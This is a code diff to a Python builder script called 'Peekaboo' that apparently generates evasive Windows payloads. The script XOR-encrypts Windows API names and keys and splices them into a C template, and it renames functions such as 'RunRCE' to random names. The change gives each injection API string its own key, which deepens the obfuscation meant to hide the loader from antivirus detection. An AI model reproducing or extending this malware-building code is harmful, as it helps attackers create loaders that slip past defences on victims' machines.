@@ -21,13 +21,12 @@ class Colors:
 class PeekabooEncryptor():
     def __init__(self):
         self.PAYLOAD_KEY = self.random()
-        self.FUNC_KEY = self.random()
 
     def payload_key(self):
         return self.PAYLOAD_KEY
 
     def func_key(self):
-        return self.FUNC_KEY
+        return self.random()
 
     def xor(self, data, key):
         key = str(key)
@@ -112,7 +111,13 @@ def run_peekaboo(host, port):
     data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
-    data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
+
+    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = "' + va_key + '";')
+    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = "' + vp_key + '";')
+    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = "' + ct_key + '";')
+    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
+    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = "' + rmm_key + '";')
+
     data = data.replace('RunRCE', f_rce)
     data = data.replace('XOR', f_xor)
 
